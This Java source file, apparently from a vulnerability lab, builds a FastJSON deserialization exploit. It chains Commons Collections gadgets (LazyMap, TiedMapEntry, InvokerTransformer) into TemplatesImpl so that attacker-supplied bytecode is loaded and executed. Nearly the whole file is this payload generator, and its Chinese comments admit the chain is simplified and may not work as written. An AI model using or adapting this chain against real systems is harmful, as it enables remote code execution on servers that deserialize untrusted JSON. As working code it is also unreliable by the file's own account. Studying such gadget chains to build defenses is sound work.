package com.govuln.fastjsonattack;

import com.alibaba.fastjson.JSON;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

/**
 * FastJSON Commons Collections Gadget
 * 利用 Commons Collections 链触发 TemplatesImpl
 * 
 * 原理：
 * FastJSON 反序列化时，会调用 getter/setter 方法
 * 通过 Commons Collections 的 LazyMap 和 TiedMapEntry，在 hashCode() 时触发
 */
public class FastJSONCommonsCollections {
    
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    
    /**
     * 生成基于 Commons Collections + TemplatesImpl 的 FastJSON payload
     * @param clazzBytes 恶意类的字节码
     * @return JSON 字符串
     */
    public String getPayload(byte[] clazzBytes) throws Exception {
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{clazzBytes});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        
        // 创建 InvokerTransformer，用于调用 newTransformer 方法
        Transformer transformer = new InvokerTransformer("getClass", null, null);
        
        // 创建 LazyMap
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformer);
        
        // 创建 TiedMapEntry
        TiedMapEntry tme = new TiedMapEntry(outerMap, obj);
        
        // 创建 HashMap，当调用 hashCode() 时会触发
        Map expMap = new HashMap();
        expMap.put(tme, "valuevalue");
        
        // 清空 outerMap，避免提前触发
        outerMap.clear();
        
        // 修改 transformer 的方法名为 newTransformer
        setFieldValue(transformer, "iMethodName", "newTransformer");
        
        // FastJSON 反序列化 HashMap 时，会调用 hashCode()
        // hashCode() -> TiedMapEntry.hashCode() -> getValue() -> LazyMap.get() 
        // -> InvokerTransformer.transform() -> TemplatesImpl.newTransformer()
        
        // 将对象转换为 JSON
        // 注意：FastJSON 需要能够序列化这些对象
        // 我们需要手动构造 JSON，因为某些类可能无法直接序列化
        
        // 实际上，FastJSON 在反序列化时，对于某些复杂对象可能无法正确处理
        // 更好的方法是使用 JdbcRowSetImpl 或者直接使用 TemplatesImpl + Feature.SupportNonPublicField
        
        // 这里我们返回一个简化的 payload，实际使用时需要根据具体情况调整
        return JSON.toJSONString(expMap);
    }
}

